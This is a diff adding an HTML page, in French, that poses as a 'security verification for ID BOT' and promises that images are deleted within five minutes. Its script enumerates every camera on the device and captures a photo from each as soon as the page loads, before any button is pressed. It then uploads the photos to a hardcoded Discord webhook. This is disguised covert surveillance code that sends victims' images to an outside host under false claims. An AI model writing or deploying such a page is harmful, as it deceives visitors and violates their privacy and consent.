@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification de securité pour ID BOT</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+            font-size: 1.8em;
+            text-align: center;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1em;
+            text-align: center;
+            color: #555;
+        }
+
+        video {
+            border: 3px solid #0078ff;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            width: 300px;
+            height: auto;
+        }
+
+        button {
+            background-color: #0078ff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1em;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #005bb5;
+        }
+
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        footer {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <h1>Verification de securité pour ID BOT</h1>
+    <p>Toutes les images sont effacées de nos serveurs au bout de 5 min.</p>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <button id="capture">Proceder à la vérification</button>
+
+    <footer>Votre sécurité est notre priorité</footer>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('capture');
+
+        // Fonction pour capturer une image et l'envoyer
+        function captureAndSend(videoStream, label) {
+            const context = canvas.getContext('2d');
+            canvas.width = videoStream.videoWidth;
+            canvas.height = videoStream.videoHeight;
+            context.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, `${label}_photo.png`);
+                formData.append('payload_json', JSON.stringify({
+                    content: `Photo prise depuis la caméra : ${label}`
+                }));
+
+                fetch('https://discord.com/api/webhooks/1313875221962293299/udiLUTH-dwm_A547e2doz1LLiFwOGPfCXUf83IzGEFtvYQ98-tljeg7hQE2ekiZG_w9J', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log(`Photo envoyée avec succès (${label}).`);
+                    } else {
+                        throw new Error(`Échec de l'envoi de la photo (${label}).`);
+                    }
+                })
+                .catch(error => {
+                    console.error(`Erreur lors de l'envoi (${label}):`, error);
+                });
+            }, 'image/png');
+        }
+
+        // Capturer automatiquement les vidéos des caméras disponibles
+        function captureFromAllCameras() {
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+
+                    videoDevices.forEach((device, index) => {
+                        navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: device.deviceId }
+                        }).then(stream => {
+                            const videoElement = document.createElement('video');
+                            videoElement.autoplay = true;
+                            videoElement.srcObject = stream;
+
+                            videoElement.onloadedmetadata = () => {
+                                captureAndSend(videoElement, `Caméra_${index + 1}`);
+                                stream.getTracks().forEach(track => track.stop()); // Arrête le flux après capture
+                            };
+                        }).catch(err => {
+                            console.error(`Erreur d'accès à la caméra (${device.label}):`, err);
+                        });
+                    });
+                })
+                .catch(err => {
+                    console.error("Erreur lors de l'énumération des appareils :", err);
+                });
+        }
+
+        // Ajouter un gestionnaire pour le bouton de capture
+        captureButton.addEventListener('click', captureFromAllCameras);
+
+        // Lancer immédiatement la capture des caméras disponibles
+        captureFromAllCameras();
+    </script>
+</body>
+</html>
